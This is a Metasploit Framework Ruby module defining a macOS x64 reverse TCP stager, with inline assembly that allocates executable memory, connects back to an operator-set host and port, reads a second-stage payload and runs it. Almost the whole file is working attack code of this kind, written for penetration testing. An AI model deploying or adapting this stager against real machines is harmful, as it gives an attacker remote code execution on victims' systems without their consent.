##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'

module MetasploitModule

  CachedSize = 168

  include Msf::Payload::TransportConfig
  include Msf::Payload::Stager

  def initialize(info = { })
    super(merge_info(info,
      'Name'        => 'Reverse TCP Stager',
      'Description' => 'Connect, read length, read buffer, execute',
      'Author'      => 'nemo <nemo[at]felinemenace.org>',
      'License'     => MSF_LICENSE,
      'Platform'    => 'osx',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Convention'  => 'sockedi',
    ))
  end

  def generate(opts = {})
    encoded_port = "%.8x" % [datastore['LPORT'].to_i,2].pack("vv").unpack("N").first
    encoded_host = "%.8x" % Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
    retry_count = datastore['StagerRetryCount']
    seconds = datastore['StagerRetryWait']
    sleep_seconds = seconds.to_i
    sleep_nanoseconds = (seconds % 1 * 1000000000).to_i

    stager_asm = %(
    ; mmap(0x0, 0x1000, 0x7, 0x1002, 0x0, 0x0)
    push 0
    pop rdi
    push 0x1000
    pop rsi
    push 7
    pop rdx
    push 0x1002
    pop r10
    push 0
    pop r8
    push 0
    pop r9
    push 0x20000c5
    pop rax
    syscall
    jb failed

    mov r12, rax
    push 0
    pop r10
    push #{retry_count}
    pop r11

  socket:
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    push    2
    pop     rdi              ; rdi=AF_INET
    push    1
    pop     rsi              ; rsi=SOCK_STREAM
    push    0
    pop     rdx              ; rdx=IPPROTO_IP
    push    0x2000061
    pop     rax
    syscall
    jb retry

    ; connect (sockfd, {AF_INET,4444,127.0.0.1}, 16);
    mov     rdi, rax
    mov     rax, 0x#{encoded_host}#{encoded_port}
    push    rax
    push    rsp
    pop     rsi
    push    16
    pop     rdx
    push    0x2000062
    pop     rax
    syscall
    jb retry

    ; recvfrom(sockfd, addr, 0x1000)
    mov rsi, r12
    push 0x1000
    pop rdx
    push 0x200001d
    pop rax
    syscall
    jb retry

    call r12

  retry:
    dec r11
    jz failed

    push 0
    pop rdi
    push 0
    pop rsi
    push 0
    pop rdx
    push 0
    pop r10
    push   0x#{sleep_nanoseconds.to_s(16)}
    push   0x#{sleep_seconds.to_s(16)}
    push rsp
    pop r8
    push 0x200005d
    pop rax
    syscall
    jmp socket

  failed:
    push   0x2000001
    pop    rax
    push   0x1
    pop    rdi
    syscall ; exit(1)
    )

    Metasm::Shellcode.assemble(Metasm::X64.new, stager_asm).encode_string
  end
end
